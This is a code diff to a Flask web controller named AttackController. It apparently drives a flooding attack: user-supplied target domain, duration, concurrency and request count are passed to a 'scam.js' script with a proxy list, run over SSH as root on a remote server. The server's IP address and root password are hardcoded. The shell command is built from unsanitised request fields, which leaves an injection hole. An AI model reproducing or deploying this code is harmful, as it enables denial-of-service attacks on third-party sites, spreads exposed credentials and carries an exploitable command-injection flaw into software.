@@ -1,7 +1,32 @@
 from flask import jsonify, request
 import subprocess
+import paramiko
 
 class AttackController:
+    def _executeRemoteCommand(self, hostname, username, password, command):
+        try:
+            # Initialize SSH client
+            ssh = paramiko.SSHClient()
+            # Automatically add host keys
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            
+            # Connect to remote host
+            ssh.connect(hostname, username=username, password=password)
+            
+            # Execute command
+            stdin, stdout, stderr = ssh.exec_command(command)
+            
+            # Get output
+            output = stdout.read().decode().strip()
+            error = stderr.read().decode().strip()
+            
+            # Close connection
+            ssh.close()
+            
+            return output, error
+        except Exception as e:
+            return None, str(e)
+
     def attack(self):
         data = request.get_json()
         domain = data.get('domain', '')
@@ -15,12 +40,26 @@ class AttackController:
                 "message": "Domain is required"
             }), 400
         
-        command = f"xvfb-run node scam.js {domain} {time} {concurrents} {requests} proxy.txt --debug true --auth true"
 
+        command = f"xvfb-run /root/.nvm/versions/node/v20.18.1/bin/node scam.js {domain} {time} {concurrents} {requests} proxy.txt --debug true --auth true"
+
+        # SSH connection details
+        hostname = "199.204.99.242"
+        username = "root" 
+        password = "42f1cb88E05w"
+        
+        output, error = self._executeRemoteCommand(hostname, username, password, command)
+        
+        if error:
+            return jsonify({
+                "status": "error",
+                "message": error
+            }), 500
+            
         return jsonify({
             "status": "success",
-            "message": f"Command '{command}' timeout after {time} seconds as expected"
-        }), 200
+            "output": output
+        })
         # try:
         #     # Kill previous Xvfb and xvfb-run processes
         #     subprocess.run("pkill -9 xvfb-run; pkill -9 Xvfb", shell=True, capture_output=True, text=True)
